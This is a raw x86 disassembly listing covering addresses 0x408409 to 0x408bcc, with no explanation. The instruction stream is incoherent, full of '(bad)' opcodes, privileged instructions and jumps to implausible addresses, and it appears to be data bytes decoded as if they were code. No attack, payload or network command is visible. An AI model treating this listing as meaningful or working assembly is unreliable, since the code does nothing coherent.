  408409:	push   0x77
  40840b:	or     BYTE PTR [edx-0x10],ch
  40840e:	nop
  40840f:	or     BYTE PTR [eax],ch
  408411:	lahf   
  408412:	ss ret 
  408414:	lea    eax,[ecx+0x557e23d9]
  40841a:	and    esi,esp
  40841c:	rcl    DWORD PTR [ebp-0x5f420c10],1
  408422:	jl     0x408456
  408424:	pop    ecx
  408425:	retf   0xef77
  408428:	outs   dx,DWORD PTR ds:[esi]
  408429:	(bad)  
  40842a:	js     0x40840b
  40842c:	mov    cl,0x33
  40842e:	call   0x4428fe59
  408433:	retf   0xa4b6
  408436:	xor    eax,esi
  408438:	mov    ds:0x54979655,eax
  40843d:	jp     0x40847c
  40843f:	sbb    al,cl
  408441:	and    edi,edx
  408443:	cmp    bl,BYTE PTR [edx-0x41293951]
  408449:	xchg   edi,eax
  40844a:	pushf  
  40844b:	jae    0x408420
  40844d:	pushf  
  40844e:	ret    
  40844f:	jo     0x4084af
  408451:	lahf   
  408452:	js     0x408494
  408454:	xchg   edi,eax
  408455:	sub    eax,0xc48cffb0
  40845a:	sbb    esp,DWORD PTR [esi-0x3]
  40845d:	ins    DWORD PTR es:[edi],dx
  40845e:	outs   dx,BYTE PTR ds:[esi]
  40845f:	das    
  408460:	pop    ds
  408461:	ins    DWORD PTR es:[edi],dx
  408462:	imul   BYTE PTR [ebp+0x32]
  408465:	xchg   esp,eax
  408466:	pop    ebx
  408467:	add    al,0xa0
  408469:	jg     0x40841f
  40846b:	ja     0x408482
  40846d:	xchg   ecx,eax
  40846e:	jg     0x40845c
  408470:	xchg   edi,eax
  408471:	add    DWORD PTR [ebx-0x653150c9],ebx
  408477:	jo     0x40845c
  408479:	jmp    0x4391:0x9b566960
  408480:	mov    ebx,DWORD PTR [edx+0x1b06b5f9]
  408486:	dec    ebx
  408487:	enter  0x78a9,0x9e
  40848b:	outs   dx,DWORD PTR ds:[esi]
  40848c:	das    
  40848d:	dec    eax
  40848e:	sub    al,0xc0
  408490:	test   dl,dh
  408492:	retf   0xfe03
  408495:	ret    
  408496:	shl    ecx,cl
  408498:	fwait
  408499:	aad    0x2a
  40849b:	ins    BYTE PTR es:[edi],dx
  40849c:	push   0x44
  40849e:	sbb    al,BYTE PTR ss:[eiz*1-0x826636f]
  4084a6:	jp     0x4084ea
  4084a8:	inc    ebx
  4084a9:	ds dec ecx
  4084ab:	retf   0x15e
  4084ae:	ret    
  4084af:	mov    dl,0xee
  4084b1:	pop    es
  4084b2:	pop    ecx
  4084b3:	clc    
  4084b4:	jl     0x40846b
  4084b6:	adc    BYTE PTR [ebp+0x4],cl
  4084b9:	test   dl,0xd5
  4084bc:	sti    
  4084bd:	stc    
  4084be:	push   esp
  4084bf:	loop   0x408465
  4084c1:	repz jae 0x408511
  4084c4:	fiadd  WORD PTR [edi]
  4084c6:	inc    esp
  4084c7:	loop   0x408542
  4084c9:	adc    dl,BYTE PTR [ebp+0x439d8c89]
  4084cf:	ds pop eax
  4084d1:	std    
  4084d2:	push   edx
  4084d3:	inc    ebx
  4084d4:	or     ch,BYTE PTR [eax]
  4084d6:	jae    0x408511
  4084d8:	sbb    ebp,DWORD PTR [esp+edi*2-0x6e8370f2]
  4084df:	mov    ebx,DWORD PTR [ecx+ebp*4+0xa]
  4084e3:	popf   
  4084e4:	lods   eax,DWORD PTR ds:[esi]
  4084e5:	test   cl,ch
  4084e7:	in     al,0x51
  4084e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084ea:	in     eax,0xd6
  4084ec:	mov    BYTE PTR [edx+0x6660e4e4],ah
  4084f2:	daa    
  4084f3:	push   eax
  4084f4:	push   ebx
  4084f5:	pop    es
  4084f6:	ret    
  4084f7:	dec    ecx
  4084f8:	or     bh,BYTE PTR ds:0x46cad8a8
  4084fe:	push   esp
  4084ff:	push   esp
  408500:	scas   al,BYTE PTR es:[edi]
  408501:	gs call 0xfceff9eb
  408507:	jns    0x408540
  408509:	mov    dh,0xbf
  40850b:	neg    BYTE PTR [ebx+0x1d2eadda]
  408511:	mov    cl,0xff
  408513:	pop    edi
  408514:	xchg   ebp,eax
  408515:	push   edx
  408516:	mov    esp,fs
  408518:	and    BYTE PTR [ebp+0x6d00b940],0xbe
  40851f:	arpl   WORD PTR [eax+0x1239a852],cx
  408525:	xlat   BYTE PTR ds:[ebx]
  408526:	lea    edx,[edi]
  408528:	std    
  408529:	add    BYTE PTR [edi],bh
  40852b:	add    dl,dh
  40852d:	cmp    bh,BYTE PTR [eax+edi*1]
  408530:	stos   BYTE PTR es:[edi],al
  408531:	(bad)  
  408532:	aad    0x6c
  408534:	(bad)  
  408535:	jae    0x40859e
  408537:	js     0x40857d
  408539:	leave  
  40853a:	call   0x7f50ad55
  40853f:	sbb    ah,BYTE PTR [ebx]
  408541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408542:	dec    edi
  408543:	into   
  408544:	sahf   
  408545:	adc    esi,DWORD PTR [eax]
  408547:	xor    esp,DWORD PTR [edx+0x794f2ea6]
  40854d:	scas   al,BYTE PTR es:[edi]
  40854e:	jge    0x408586
  408550:	or     DWORD PTR [eax+0x7e],0x8b129322
  408557:	xchg   ecx,eax
  408558:	pop    ss
  408559:	mov    edx,0xfa867a10
  40855e:	test   BYTE PTR ds:0xcb1639bd,dl
  408564:	adc    dh,dl
  408566:	push   ds
  408567:	lahf   
  408568:	das    
  408569:	inc    ebx
  40856a:	loopne 0x408547
  40856c:	mov    bl,0xe2
  40856e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40856f:	mov    dl,0xc9
  408571:	in     eax,dx
  408572:	cli    
  408573:	dec    esi
  408574:	fld    st(6)
  408576:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408577:	add    eax,0xbb23fa20
  40857c:	and    ah,bl
  40857e:	in     al,0x7c
  408580:	jbe    0x408592
  408582:	fild   DWORD PTR [edx+0x1fcae024]
  408588:	sbb    DWORD PTR [edi],edi
  40858a:	push   edx
  40858b:	jno    0x4085f5
  40858d:	add    eax,0xbb76017f
  408592:	pop    edx
  408593:	sbb    eax,0xf738268c
  408598:	jo     0x408604
  40859a:	(bad)  
  40859b:	mov    ah,0x8f
  40859d:	test   DWORD PTR [ecx-0x2c73f328],ebx
  4085a3:	mov    ecx,0x64114a8d
  4085a8:	fcmove st,st(4)
  4085aa:	xchg   ecx,eax
  4085ab:	dec    eax
  4085ac:	sbb    bh,BYTE PTR [esi+0x45]
  4085af:	lods   al,BYTE PTR ds:[esi]
  4085b0:	sbb    ecx,esp
  4085b2:	ss test al,0xe3
  4085b5:	loope  0x40858a
  4085b7:	mov    bh,0x7
  4085b9:	mov    cl,0x61
  4085bb:	mov    edi,ebx
  4085bd:	aas    
  4085be:	xchg   ebp,eax
  4085bf:	stos   DWORD PTR es:[edi],eax
  4085c0:	les    edx,FWORD PTR [ecx]
  4085c2:	(bad)  
  4085c3:	inc    DWORD PTR [edi]
  4085c5:	jnp    0x408593
  4085c7:	ficom  WORD PTR [ebp-0x1a174d2b]
  4085cd:	cld    
  4085ce:	inc    eax
  4085cf:	(bad)
  4085d2:	in     eax,0xaa
  4085d4:	stos   DWORD PTR es:[edi],eax
  4085d5:	and    DWORD PTR [edi-0x2b437ccc],esi
  4085db:	in     al,dx
  4085dc:	cmp    esi,0x47
  4085df:	fimul  DWORD PTR [ebx-0x46]
  4085e2:	push   ebp
  4085e3:	mov    eax,ds:0x33b38f0a
  4085e8:	in     eax,0xaa
  4085ea:	outs   dx,BYTE PTR ds:[esi]
  4085eb:	arpl   WORD PTR [edx+esi*2],cx
  4085ee:	loopne 0x408589
  4085f0:	mov    eax,0xcd5ebed7
  4085f5:	(bad)  
  4085f6:	popa   
  4085f7:	(bad)  
  4085f9:	(bad)  
  4085fa:	xchg   ebx,eax
  4085fb:	test   DWORD PTR ds:0x1c7868e8,edx
  408601:	jmp    0x21383033
  408606:	push   edx
  408607:	lock into 
  408609:	dec    edx
  40860a:	mov    dl,0x88
  40860c:	mov    esp,0xd65e47a4
  408611:	jle    0x40868b
  408613:	push   ebx
  408614:	enter  0xcef6,0xd5
  408618:	xchg   esp,eax
  408619:	in     al,dx
  40861a:	lea    edi,[ecx]
  40861c:	pop    ebx
  40861d:	inc    ecx
  40861e:	rsm    
  408620:	and    eax,0x725b411b
  408625:	pop    edx
  408626:	xor    ch,dl
  408628:	mov    bh,dh
  40862a:	pop    ss
  40862b:	(bad)  
  40862c:	(bad)  
  40862d:	je     0x4085e0
  40862f:	xor    dl,ah
  408631:	dec    edi
  408632:	mov    esp,0xbcddf203
  408637:	mov    dl,0xc
  408639:	fcomp  QWORD PTR [edi]
  40863b:	ret    0x3d6e
  40863e:	aam    0xb3
  408640:	jl     0x408634
  408642:	mov    DWORD PTR [ebx+esi*4-0x18bb3435],ecx
  408649:	push   ebp
  40864a:	retf   
  40864b:	jmp    0x5684673c
  408650:	pop    ecx
  408651:	jl     0x40860f
  408653:	jp     0x4085ea
  408655:	jmp    0xdcf76083
  40865a:	pusha  
  40865b:	sbb    ch,BYTE PTR [eax+0x50c30445]
  408661:	sub    BYTE PTR [ecx+0x4a],bl
  408664:	jmp    0x90c0:0x23c1ab3b
  40866b:	or     DWORD PTR [ebx-0x6799d736],esi
  408671:	add    ecx,DWORD PTR [ecx]
  408673:	test   eax,0x2b016aec
  408678:	dec    ecx
  408679:	fbstp  TBYTE PTR [edi+0x5e]
  40867c:	pop    eax
  40867d:	xchg   esi,eax
  40867e:	mov    al,0x59
  408680:	sub    BYTE PTR [esi],dh
  408682:	and    DWORD PTR [ebx-0x14792d22],esi
  408688:	jmp    0x5919da80
  40868d:	jno    0x4086df
  40868f:	push   ecx
  408690:	fdiv   QWORD PTR [eax+edi*2]
  408693:	inc    esp
  408694:	jle    0x4086a8
  408696:	in     al,0xc6
  408698:	mov    BYTE PTR [ebx],ch
  40869a:	sbb    BYTE PTR [ebx+eax*4],bl
  40869d:	loope  0x40868c
  40869f:	mov    bl,0xc5
  4086a1:	es out 0xd3,al
  4086a4:	lods   eax,DWORD PTR ds:[esi]
  4086a5:	fisubr DWORD PTR [ebx+0x62399d58]
  4086ab:	loop   0x4086d0
  4086ad:	retf   
  4086ae:	push   0xc38a05a0
  4086b3:	sub    edx,ecx
  4086b5:	mov    ds:0x5eee84fe,al
  4086ba:	iret   
  4086bb:	push   cs
  4086bc:	pop    es
  4086bd:	js     0x4086ac
  4086bf:	je     0x408721
  4086c1:	lds    ebp,FWORD PTR [edx-0x66]
  4086c4:	rcr    BYTE PTR [edi-0x1e584f94],0x89
  4086cb:	sub    al,0x9b
  4086cd:	mov    eax,0x6308000c
  4086d2:	jbe    0x4086fa
  4086d4:	retf   0x258c
  4086d7:	sub    DWORD PTR [eax+0x28],eax
  4086da:	push   ss
  4086db:	loopne 0x4086d8
  4086dd:	add    eax,0xe69fb55b
  4086e2:	add    ecx,DWORD PTR ds:0xade96e40
  4086e8:	lds    edi,FWORD PTR [edx-0x2cc593c2]
  4086ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086ef:	push   ss
  4086f0:	loopne 0x408704
  4086f2:	sub    eax,0x2db673ef
  4086f7:	ds mov bl,0x9
  4086fa:	(bad)  
  4086fb:	lock or al,0x4f
  4086fe:	xchg   esi,eax
  4086ff:	(bad)  
  408700:	aas    
  408701:	xor    eax,0x38d3dc
  408706:	jnp    0x4086d5
  408708:	xchg   ebx,eax
  408709:	mov    esp,0x8d13ed09
  40870e:	lods   eax,DWORD PTR ds:[esi]
  40870f:	ds pop edx
  408711:	xor    al,BYTE PTR [ebp-0xd]
  408714:	jo     0x4086a6
  408716:	in     eax,dx
  408717:	mov    ds:0xb4fb9361,al
  40871c:	ret    0x7f3
  40871f:	add    DWORD PTR [esi-0x5c],esp
  408722:	mov    WORD PTR [eax-0x73],es
  408725:	retf   0x3d60
  408728:	(bad)  
  40872a:	les    ebp,FWORD PTR [ebx-0x8]
  40872d:	cwde   
  40872e:	repz ret 0xa5de
  408732:	(bad)  
  408733:	cmp    BYTE PTR [edi+ebp*2],cl
  408736:	adc    esp,DWORD PTR [ecx]
  408738:	les    esi,FWORD PTR [esi+0x56]
  40873b:	dec    ebp
  40873c:	call   0xcb445138
  408741:	pop    eax
  408742:	xchg   esp,eax
  408743:	mov    cl,0xcd
  408745:	mov    eax,ds:0xbccc690d
  40874a:	cmp    eax,0xdd9c1f2d
  40874f:	xchg   ecx,eax
  408750:	(bad)  
  408751:	sub    eax,DWORD PTR [esi+0x50]
  408754:	nop
  408755:	pop    ss
  408756:	mov    ch,BYTE PTR [ecx+0x7f003cd]
  40875c:	adc    edi,DWORD PTR [ebx-0x82f6cf0]
  408762:	nop
  408763:	sub    DWORD PTR [ebx],esp
  408765:	neg    DWORD PTR [esi-0x18d6fd63]
  40876b:	pop    es
  40876c:	das    
  40876d:	mov    ebx,0xe806ebd4
  408772:	ins    DWORD PTR es:[edi],dx
  408773:	and    al,0x89
  408775:	or     eax,0x1ec31171
  40877a:	inc    ecx
  40877b:	push   es
  40877c:	adc    ecx,eax
  40877e:	sbb    BYTE PTR [edx+0x73c36fe6],cl
  408784:	xchg   ecx,eax
  408785:	arpl   ax,di
  408787:	(bad)  [ecx]
  408789:	add    eax,0x5e883086
  40878e:	push   eax
  40878f:	xchg   edx,eax
  408790:	pusha  
  408791:	xchg   ecx,eax
  408792:	iret   
  408793:	add    eax,0x83000e74
  408798:	lods   eax,DWORD PTR ds:[esi]
  408799:	inc    edi
  40879a:	pop    esi
  40879b:	sub    eax,0xccdfa409
  4087a0:	les    edi,FWORD PTR [edx+0x553ee157]
  4087a6:	jno    0x4087ef
  4087a8:	or     al,0xa
  4087aa:	dec    ecx
  4087ab:	pop    ds
  4087ac:	push   ebx
  4087ad:	mov    ch,0x65
  4087af:	mov    dl,0xf4
  4087b1:	or     ebx,DWORD PTR [edi-0x5bb941af]
  4087b7:	mov    edx,0x1234ea82
  4087bc:	cmp    edi,DWORD PTR [edi]
  4087be:	inc    ebp
  4087bf:	inc    ebp
  4087c0:	in     al,0x65
  4087c2:	out    0x8b,al
  4087c4:	daa    
  4087c5:	pusha  
  4087c6:	xor    eax,0xa1783d4f
  4087cb:	add    eax,0xebdb8419
  4087d0:	mov    edx,0x266d76f
  4087d5:	aaa    
  4087d6:	fs stos BYTE PTR es:[edi],al
  4087d8:	jp     0x4087f4
  4087da:	pop    eax
  4087db:	bound  esp,QWORD PTR [edx+0x1308315e]
  4087e1:	and    ebx,ebx
  4087e3:	scas   eax,DWORD PTR es:[edi]
  4087e4:	lahf   
  4087e5:	sahf   
  4087e6:	out    0x61,al
  4087e8:	mov    eax,edx
  4087ea:	mov    ecx,0xf3689b18
  4087ef:	cld    
  4087f0:	pop    edx
  4087f1:	les    ebx,FWORD PTR [ecx-0x16]
  4087f4:	or     bh,bl
  4087f6:	and    DWORD PTR [edi+ebx*1],edi
  4087f9:	(bad)  
  4087fa:	xchg   edx,eax
  4087fb:	mov    ebx,0xea6b3316
  408800:	ds idiv cl
  408803:	jge    0x40886a
  408805:	retf   0xc2f5
  408808:	sahf   
  408809:	inc    ecx
  40880a:	shr    DWORD PTR [ebx],cl
  40880c:	sbb    eax,0xf570ebbc
  408811:	inc    DWORD PTR [ebp-0x6cd7d778]
  408817:	fld    QWORD PTR [ecx-0x15]
  40881a:	icebp  
  40881b:	in     eax,dx
  40881c:	push   es
  40881d:	js     0x4087d5
  40881f:	dec    ecx
  408820:	push   ecx
  408821:	in     al,dx
  408822:	mov    edx,DWORD PTR [ebx]
  408824:	mov    ch,0xaf
  408826:	clc    
  408827:	sbb    al,0x99
  408829:	std    
  40882a:	push   0xffffffac
  40882c:	fisttp DWORD PTR [eax+edi*4+0x617ffe94]
  408833:	sub    edx,DWORD PTR [eax+0x6b]
  408836:	rsm    
  408838:	cli    
  408839:	jne    0x4088b0
  40883b:	dec    ebx
  40883c:	jae    0x408873
  40883e:	or     al,0xf
  408840:	out    dx,al
  408841:	fnstcw WORD PTR [edi+0x352dbe16]
  408847:	jmp    0x408818
  408849:	mov    cl,dh
  40884b:	mov    ds:0x9a9bd565,eax
  408850:	jo     0x4087d6
  408852:	and    cl,BYTE PTR [edx-0x4c]
  408855:	sbb    eax,0x5800a53a
  40885a:	xor    DWORD PTR [ebp+0x2d],ebp
  40885d:	dec    ecx
  40885e:	pusha  
  40885f:	jae    0x4087f0
  408861:	outs   dx,BYTE PTR ds:[esi]
  408862:	cld    
  408863:	mov    al,ds:0x27c89e3c
  408868:	inc    ebp
  408869:	(bad)  
  40886b:	jne    0x408844
  40886d:	jmp    0xc4e03e3f
  408872:	repnz mov bh,0x19
  408875:	mov    eax,0x7a1140a8
  40887a:	loop   0x40885c
  40887c:	inc    eax
  40887d:	sbb    ebp,DWORD PTR [ebp-0x36]
  408880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408881:	or     esp,ecx
  408883:	jmp    0xafad:0xb657334e
  40888a:	dec    esi
  40888b:	jmp    0xe03a7b8b
  408890:	loopne 0x408840
  408892:	dec    eax
  408893:	ds sub al,0xbb
  408896:	mov    bl,0x60
  408898:	mov    bh,0xa0
  40889a:	rcr    BYTE PTR [eax-0x7467c54e],1
  4088a0:	arpl   WORD PTR [edx-0x17],bp
  4088a3:	(bad)  
  4088a4:	push   esp
  4088a5:	std    
  4088a6:	mov    al,0x4a
  4088a8:	adc    al,0x96
  4088aa:	addr16 pop esp
  4088ac:	and    BYTE PTR [eax-0xd],dl
  4088af:	ret    
  4088b0:	call   0xdb6cafa4
  4088b5:	xlat   BYTE PTR ds:[ebx]
  4088b6:	setb   BYTE PTR [esi+ebx*2]
  4088ba:	jl     0x4088ea
  4088bc:	sti    
  4088bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088be:	sbb    eax,0xe889bdb3
  4088c3:	add    al,0xfc
  4088c6:	popf   
  4088c7:	add    DWORD PTR [edx],edx
  4088c9:	retf   
  4088ca:	jmp    0x408905
  4088cc:	repz mov dh,0x83
  4088cf:	hlt    
  4088d0:	leave  
  4088d1:	and    esi,DWORD PTR ds:0x59f7cb26
  4088d7:	and    al,0xf2
  4088d9:	out    0x38,eax
  4088db:	loop   0x408954
  4088dd:	fcomp  QWORD PTR [ebp-0x664c0e43]
  4088e3:	fcomip st,st(1)
  4088e5:	les    ecx,FWORD PTR [ecx]
  4088e7:	sbb    al,0xbe
  4088e9:	std    
  4088ea:	out    0x8d,al
  4088ec:	jns    0x408884
  4088ee:	xor    al,BYTE PTR [ebp+0x6d]
  4088f1:	and    eax,0x658f3344
  4088f6:	ins    DWORD PTR es:[edi],dx
  4088f7:	mov    esp,0xd6d475a4
  4088fc:	mov    ss,WORD PTR [edx+0x27]
  4088ff:	inc    esi
  408900:	test   al,0x19
  408903:	ret    
  408904:	mov    ch,0x1
  408906:	sbb    dh,0x59
  408909:	fld    TBYTE PTR [edi-0x3f24ac1b]
  40890f:	xchg   dl,cl
  408911:	repnz pusha 
  408913:	or     al,0x6
  408915:	(bad)  
  408916:	mov    DWORD PTR [ecx-0x3a],ebx
  408919:	pop    ebp
  40891a:	jae    0x40890c
  40891c:	out    dx,al
  40891d:	and    BYTE PTR [ecx+0x48],0xf1
  408921:	sbb    al,0x87
  408923:	call   0x192b:0x4eee271b
  40892a:	int3   
  40892b:	dec    edx
  40892c:	enter  0x3d16,0x89
  408930:	mov    esi,DWORD PTR [edi+0x7e]
  408933:	jmp    eax
  408935:	mov    edi,ebp
  408937:	scas   eax,DWORD PTR es:[edi]
  408938:	adc    ch,cl
  40893a:	stc    
  40893b:	call   0x397f13b7
  408940:	and    DWORD PTR [esi-0x27f213ae],ecx
  408946:	fsub   st,st(3)
  408948:	dec    edx
  408949:	das    
  40894a:	inc    ebx
  40894b:	call   FWORD PTR [ebx+0x0]
  40894e:	bound  ebx,QWORD PTR [eax]
  408950:	pop    eax
  408951:	mov    al,0x75
  408953:	xor    DWORD PTR [edi],edx
  408955:	(bad)  
  408957:	cld    
  408958:	mov    ds:0xe16442ec,al
  40895d:	shl    DWORD PTR [edx],cl
  40895f:	std    
  408960:	pop    eax
  408961:	mov    cl,0xc
  408963:	xchg   ebx,eax
  408964:	adc    WORD PTR [edx-0x670a80a3],di
  40896b:	dec    ecx
  40896c:	enter  0xd5d5,0xb1
  408970:	shl    ch,1
  408972:	jg     0x40896e
  408974:	xor    BYTE PTR [esi],ah
  408976:	mov    edi,0x69a90e93
  40897b:	add    DWORD PTR [ebx+0x1e],ebp
  40897e:	ror    DWORD PTR [ecx+0x368c8695],1
  408984:	mov    ebx,fs
  408986:	jp     0x40895d
  408988:	mov    eax,ds:0xb2512432
  40898d:	jg     0x408a0c
  40898f:	or     DWORD PTR [edx+0x10b602b5],ebx
  408995:	loopne 0x4089bc
  408997:	xor    BYTE PTR ds:0xd10d325c,dh
  40899d:	dec    eax
  40899e:	sbb    al,0x33
  4089a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089a1:	std    
  4089a2:	test   BYTE PTR [edi+0x3b05cd4],ah
  4089a8:	rol    BYTE PTR [edx+0x120ee82c],0x13
  4089af:	xchg   ebp,eax
  4089b0:	and    esp,DWORD PTR [esi-0x46]
  4089b3:	sti    
  4089b4:	add    al,0xd1
  4089b6:	inc    esp
  4089b7:	repz push ebp
  4089b9:	fild   DWORD PTR [edx+0x7c30146a]
  4089bf:	add    esp,esi
  4089c1:	scas   al,BYTE PTR es:[edi]
  4089c2:	mov    ds:0xf066eb67,al
  4089c7:	dec    ebx
  4089c8:	pop    es
  4089c9:	(bad)  
  4089ca:	jns    0x40895a
  4089cc:	stc    
  4089cd:	xor    eax,0xde919536
  4089d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089d3:	push   esp
  4089d4:	pop    edx
  4089d5:	fldcw  WORD PTR [ebp-0x45c4bebf]
  4089db:	push   ecx
  4089dc:	add    DWORD PTR [eax+0x36],0x8b1d7e15
  4089e3:	scas   eax,DWORD PTR es:[edi]
  4089e4:	ins    BYTE PTR es:[edi],dx
  4089e5:	cmp    BYTE PTR [esi+edi*1-0x2d04f4e3],ah
  4089ec:	xor    eax,0x8fe0022b
  4089f1:	push   ebx
  4089f2:	loop   0x408a43
  4089f4:	push   edi
  4089f5:	pop    eax
  4089f6:	inc    ebp
  4089f7:	add    al,0x2f
  4089f9:	outs   dx,BYTE PTR ds:[esi]
  4089fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089fb:	pop    eax
  4089fc:	pop    edi
  4089fd:	pusha  
  4089fe:	fdiv   st(3),st
  408a00:	icebp  
  408a01:	adc    esp,ebx
  408a03:	(bad)  
  408a04:	pushf  
  408a05:	mov    ecx,0x9b89237a
  408a0a:	push   0xffffffac
  408a0c:	xlat   BYTE PTR ds:[ebx]
  408a0d:	pop    eax
  408a0e:	adc    dh,ah
  408a10:	dec    ebp
  408a11:	fisttp DWORD PTR [ecx+ecx*4+0x2f]
  408a15:	cwde   
  408a16:	xor    BYTE PTR [edi-0x3f2523cb],bh
  408a1c:	mov    esi,DWORD PTR [esi+0x6cce5c56]
  408a22:	xor    DWORD PTR [esi+edx*2],edi
  408a25:	jmp    0x8d96:0xe356afaa
  408a2c:	lods   al,BYTE PTR ds:[esi]
  408a2d:	pop    edx
  408a2e:	push   es
  408a2f:	aam    0x76
  408a31:	shr    BYTE PTR [edx],1
  408a33:	or     edi,DWORD PTR [eax+edi*4+0x71ee66ec]
  408a3a:	mov    ds:0xefc44004,al
  408a3f:	iret   
  408a40:	jno    0x408a59
  408a42:	popf   
  408a43:	ds dec ecx
  408a45:	or     DWORD PTR [ebp+ebp*2-0x50b64b9b],esp
  408a4c:	stos   BYTE PTR es:[edi],al
  408a4d:	push   esi
  408a4e:	cli    
  408a4f:	push   eax
  408a50:	jnp    0x408abf
  408a52:	fsubr  QWORD PTR [ebx]
  408a54:	fild   WORD PTR [eax+0x7a8c02a0]
  408a5a:	std    
  408a5b:	sub    dh,dl
  408a5d:	inc    eax
  408a5e:	aam    0x9b
  408a60:	jbe    0x408a4d
  408a62:	int    0x7d
  408a64:	in     al,0x55
  408a66:	stc    
  408a67:	cmp    al,0x4f
  408a69:	outs   dx,DWORD PTR ds:[esi]
  408a6a:	mov    BYTE PTR [esp+eiz*8-0xdb7d76f],dh
  408a71:	dec    esi
  408a72:	xor    BYTE PTR [ebp-0xdeb43d0],bl
  408a78:	aam    0x84
  408a7a:	cwde   
  408a7b:	push   eax
  408a7c:	fwait
  408a7d:	pop    esi
  408a7e:	or     eax,DWORD PTR [esi-0x5c]
  408a81:	mov    esi,0x564f5f69
  408a86:	setne  BYTE PTR [ebx+0x383bbbbb]
  408a8d:	scas   eax,DWORD PTR es:[edi]
  408a8e:	inc    edx
  408a8f:	(bad)  
  408a90:	test   DWORD PTR [ebp-0x46],0x283e9b5
  408a97:	and    al,BYTE PTR [edx+0x51]
  408a9a:	(bad)  
  408a9b:	mov    ds:0xe074568c,al
  408aa0:	xor    BYTE PTR cs:[esi+0x42],0x82
  408aa5:	xor    BYTE PTR [esi-0x32],ch
  408aa8:	mov    esp,0xb3388ca8
  408aad:	jg     0x408ad6
  408aaf:	mov    dl,0xaf
  408ab1:	pusha  
  408ab2:	push   edx
  408ab3:	sub    DWORD PTR [ebp+0x760184fc],esi
  408ab9:	push   es
  408aba:	ret    0xd44
  408abd:	push   0x32
  408abf:	push   cs
  408ac0:	fdiv   QWORD PTR cs:[ebx+0x16d6ebfe]
  408ac7:	jg     0x408a58
  408ac9:	xlat   BYTE PTR ds:[ebx]
  408aca:	sub    eax,0x73b19994
  408acf:	mov    ch,0xc
  408ad1:	(bad)  
  408ad2:	or     eax,0x87c87b97
  408ad7:	push   edx
  408ad8:	mov    edx,0x5e886983
  408add:	add    BYTE PTR [edx+eiz*1+0x28],0xe
  408ae2:	pop    edx
  408ae3:	xchg   ebx,eax
  408ae4:	mov    bl,0xbb
  408ae6:	std    
  408ae7:	call   0xfc08991c
  408aec:	push   es
  408aed:	repz mov al,ds:0xc773d1db
  408af3:	scas   al,BYTE PTR es:[edi]
  408af4:	in     al,0xfc
  408af6:	loop   0x408ac7
  408af8:	pusha  
  408af9:	pop    ss
  408afa:	ret    0x7f5a
  408afd:	lds    eax,FWORD PTR [si]
  408b00:	outs   dx,DWORD PTR ds:[esi]
  408b01:	jp     0x408b2a
  408b03:	test   al,0x6b
  408b05:	pushf  
  408b06:	aad    0xb
  408b08:	push   ecx
  408b09:	js     0x408b6e
  408b0b:	inc    esp
  408b0c:	gs jne 0x408aaf
  408b0f:	mov    dh,0xb8
  408b11:	xchg   bp,ax
  408b13:	iret   
  408b14:	sahf   
  408b15:	sbb    DWORD PTR [ecx+0x35],ebp
  408b18:	dec    edi
  408b19:	mov    cs,ebp
  408b1b:	jmp    0x9036:0xb5ed7f79
  408b22:	nop
  408b23:	inc    esp
  408b24:	jb     0x408b09
  408b26:	hlt    
  408b27:	js     0x408b82
  408b29:	add    DWORD PTR [eax-0x8],0xbe12af4d
  408b30:	sbb    ecx,DWORD PTR [edx-0x40]
  408b33:	inc    esi
  408b34:	dec    esi
  408b35:	sbb    al,0xe3
  408b37:	shl    BYTE PTR [eax+ecx*1],1
  408b3a:	inc    esi
  408b3b:	gs pop ss
  408b3d:	mov    eax,ds:0xc3905e10
  408b42:	into   
  408b43:	push   ebp
  408b44:	stos   BYTE PTR es:[edi],al
  408b45:	sbb    BYTE PTR [esi+ecx*4+0xe],ch
  408b49:	or     BYTE PTR [ebx+ebx*2],cl
  408b4c:	add    BYTE PTR [ebx+0x40d672d5],cl
  408b52:	sti    
  408b53:	cli    
  408b54:	or     DWORD PTR [eax],eax
  408b56:	push   ebx
  408b57:	adc    BYTE PTR [edx],bl
  408b59:	bound  ebp,QWORD PTR [ebp-0x29]
  408b5c:	xchg   edx,eax
  408b5d:	dec    edi
  408b5e:	jp     0x408b22
  408b60:	fidiv  DWORD PTR [esi]
  408b62:	inc    ebx
  408b63:	test   esp,edi
  408b65:	mov    esi,0x7848d8da
  408b6a:	cmp    BYTE PTR [esi],al
  408b6c:	and    al,BYTE PTR [edx+0x7f6bf3f6]
  408b72:	mov    ch,0x5d
  408b74:	in     al,dx
  408b75:	pop    edx
  408b76:	jmp    0x408b38
  408b78:	lds    eax,FWORD PTR [ebp-0x73]
  408b7b:	mov    esp,0xa8f2b3a5
  408b80:	fst    QWORD PTR [ecx+0x46]
  408b83:	dec    edx
  408b84:	mov    ds:0xca9c56f9,eax
  408b89:	jns    0x408bdc
  408b8b:	lahf   
  408b8c:	sub    eax,0x838174cc
  408b91:	sbb    al,0x3c
  408b93:	inc    esi
  408b94:	jae    0x408b3f
  408b96:	scas   al,BYTE PTR es:[edi]
  408b97:	mov    es,WORD PTR [ecx-0x65df8d61]
  408b9d:	dec    edx
  408b9e:	addr16 mov al,ds:0x586c
  408ba2:	pushf  
  408ba3:	xor    al,0x29
  408ba5:	out    dx,eax
  408ba6:	cmp    bh,ah
  408ba8:	add    dh,BYTE PTR [ecx]
  408baa:	lock xchg esi,eax
  408bac:	and    al,ch
  408bae:	in     al,dx
  408baf:	jmp    0x408b7a
  408bb1:	dec    edi
  408bb2:	sbb    ah,cl
  408bb4:	pop    eax
  408bb5:	out    0xc6,eax
  408bb7:	sub    dh,ch
  408bb9:	push   cs
  408bba:	or     DWORD PTR [eax-0x32ffa046],esi
  408bc0:	jecxz  0x408b4e
  408bc2:	add    al,0x69
  408bc4:	daa    
  408bc5:	in     eax,dx
  408bc6:	push   ds
  408bc7:	jl     0x408bb8
  408bc9:	jge    0x408bbf
  408bcb:	push   ds
  408bcc:	sbb    esp,DWORD PTR [ebx]
